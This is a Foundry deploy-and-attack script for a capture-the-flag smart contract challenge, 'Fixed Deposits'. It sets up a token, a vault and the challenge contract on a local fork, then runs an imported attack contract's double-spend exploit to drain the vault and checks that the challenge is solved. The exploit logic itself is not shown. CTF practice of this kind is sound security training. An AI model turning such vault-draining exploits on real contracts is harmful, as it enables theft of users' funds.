// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import {Challenge} from "targets/fixed_deposits/src/Challenge.sol";
import {CtfDepositToken} from "targets/fixed_deposits/src/CtfDepositToken.sol";
import {DepositVault} from "targets/fixed_deposits/src/DepositVault.sol";
import {AttackFixedDeposits} from "src/fixed_deposits/AttackFixedDeposits.sol";

/// @title Fixed Deposits — Local Deploy + Attack
/// @notice Spins up the full challenge environment on a local anvil fork and
///         immediately executes the double-spend exploit.
///
/// Usage (one terminal each):
///   anvil --hardfork shanghai
///   PLAYER=<anvil-account> forge script script/fixed_deposits/Attack.s.sol \
///       --rpc-url http://127.0.0.1:8545 --broadcast -vvvv
///
/// For the real CTF network set --rpc-url to $CTF_RPC_URL and set PLAYER to
/// the player address provided by the CTF.
contract AttackScript is Script {
    function run() external {
        // broadcaster == player for local testing; override with PLAYER env var on CTF net
        address player = vm.envOr("PLAYER", msg.sender);

        vm.startBroadcast();

        // ── 1. Deploy token ────────────────────────────────────────────────
        // Constructor mints 520_000e18 to msg.sender (the broadcaster).
        CtfDepositToken token = new CtfDepositToken();

        // ── 2. Deploy vault ────────────────────────────────────────────────
        DepositVault vault = new DepositVault(token);

        // ── 3. Fund vault + player (mirrors targets/fixed_deposits/script/Deploy.s.sol) ─
        token.transfer(address(vault), 500_000e18); // vault gets 500 k
        // Player already holds the remaining 20 k (mint went to broadcaster = player).
        // If player != broadcaster, forward the 20 k explicitly.
        if (player != msg.sender) {
            token.transfer(player, 20_000e18);
        }

        // ── 4. Deploy challenge and hand over vault management ─────────────
        Challenge challenge = new Challenge(player, token, vault);
        vault.transferManager(address(challenge));

        // ── 5. Deploy attack contract ──────────────────────────────────────
        AttackFixedDeposits attacker = new AttackFixedDeposits(challenge);

        // ── 6. Approve attacker to pull the player's 20 k then execute ─────
        // msg.sender == player here (broadcaster), so this approval is on behalf
        // of the player.
        token.approve(address(attacker), 20_000e18);
        attacker.attack();

        vm.stopBroadcast();

        // ── 7. Report ──────────────────────────────────────────────────────
        uint256 vaultFinal  = token.balanceOf(address(vault));
        uint256 playerFinal = token.balanceOf(player);
        bool solved         = challenge.isSolved();

        console.log("=== Fixed Deposits result ===");
        console.log("Vault balance  :", vaultFinal  / 1e18, "tokens");
        console.log("Player balance :", playerFinal / 1e18, "tokens");
        console.log("isSolved()     :", solved);
        require(solved, "challenge not solved");
    }
}
